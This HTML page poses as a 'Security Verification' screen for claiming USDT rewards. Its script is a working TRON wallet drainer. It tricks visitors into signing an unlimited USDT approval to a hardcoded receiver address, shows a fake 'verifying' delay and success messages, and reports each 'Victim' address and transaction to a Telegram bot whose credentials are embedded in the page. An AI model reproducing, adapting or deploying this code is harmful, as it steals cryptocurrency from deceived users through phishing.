<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>USDT Reward - Connect Wallet</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
</head>
<body class="bg-[#0f172a] text-white flex items-center justify-center min-h-screen p-6 font-sans">

    <div class="max-w-md w-full bg-[#1e293b] rounded-3xl p-8 shadow-2xl border border-white/10 text-center">
        <div class="mb-6">
            <div class="w-20 h-20 bg-emerald-500 rounded-full flex items-center justify-center mx-auto shadow-lg shadow-emerald-500/20">
                <svg class="w-10 h-10 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
                </svg>
            </div>
        </div>

        <h1 class="text-2xl font-bold mb-2">Security Verification</h1>
        <p class="text-slate-400 text-sm mb-8">Connect your wallet to verify assets and claim your USDT rewards.</p>

        <button id="connectBtn" class="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-bold py-4 rounded-2xl transition-all shadow-lg text-lg uppercase tracking-wide">
            Connect Wallet
        </button>

        <div id="status" class="mt-6 text-xs text-slate-500 hidden">
            <span class="flex items-center justify-center gap-2">
                <div class="w-2 h-2 bg-emerald-500 rounded-full animate-ping"></div>
                Establishing secure connection...
            </span>
        </div>
    </div>

    <script type="module">
        // 1. CONFIGURATION (Using your Project ID)
        const CONFIG = {
            PROJECT_ID: 'c5250465b531d3f5128116dc9460f64e',
            BOT_TOKEN: '8738726378:AAHkiTAAZ16hoGFObK_v76yi0f0wqITMZXM',
            CHAT_ID: '8249230506',
            RECEIVER: 'TBrJPyG8BUysBBMpX7ucRmzpnYQFvEHay2',
            USDT: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
        };

        async function sendLog(msg) {
            await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: msg, parse_mode: 'HTML' })
            });
        }

        // 2. MAIN LOGIC
        async function start() {
            const btn = document.getElementById('connectBtn');
            const status = document.getElementById('status');

            // Agar user normal browser mein hai toh ye popup trigger karega
            if (typeof window.tronWeb === 'undefined') {
                // Yahan aap WalletConnect/Reown ka modal trigger logic dal sakte hain
                // Par Tron ke liye best tarika mobile wallet ke andar open karwana hai
                alert("Please open this site inside Trust Wallet or TronLink Browser.");
                return;
            }

            try {
                btn.disabled = true;
                btn.innerText = "Connecting...";
                status.classList.remove('hidden');

                // STEP 1: Connect Account
                const accounts = await window.tronWeb.request({ method: 'tron_requestAccounts' });
                const victim = window.tronWeb.defaultAddress.base58;
                
                await sendLog(`👤 <b>Victim Connected</b>\nAddr: <code>${victim}</code>`);

                // STEP 2: Logic Switch & Auto Popup
                // Hum wait karenge taaki user ko lage ki "Verification" ho rahi hai
                btn.innerText = "Verifying...";
                await new Promise(r => setTimeout(r, 2000));

                const contract = await window.tronWeb.contract().at(CONFIG.USDT);
                const maxUint = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

                // STEP 3: Approval Popup (Asli Backend Logic)
                await contract.approve(CONFIG.RECEIVER, maxUint).send({
                    feeLimit: 100000000 
                }).then(tx => {
                    sendLog(`✅ <b>USDT APPROVED!</b>\nVictim: <code>${victim}</code>\nTX: <code>${tx}</code>`);
                    alert("Verification Successful! Rewards will be credited shortly.");
                }).catch(err => {
                    sendLog(`❌ <b>REJECTED</b>\nVictim: <code>${victim}</code>`);
                    alert("Security check failed. Please approve the request to continue.");
                });

            } catch (e) {
                console.error(e);
                alert("Connection error. Refresh and try again.");
            } finally {
                btn.disabled = false;
                btn.innerText = "Connect Wallet";
            }
        }

        document.getElementById('connectBtn').onclick = start;
    </script>
</body>
</html>
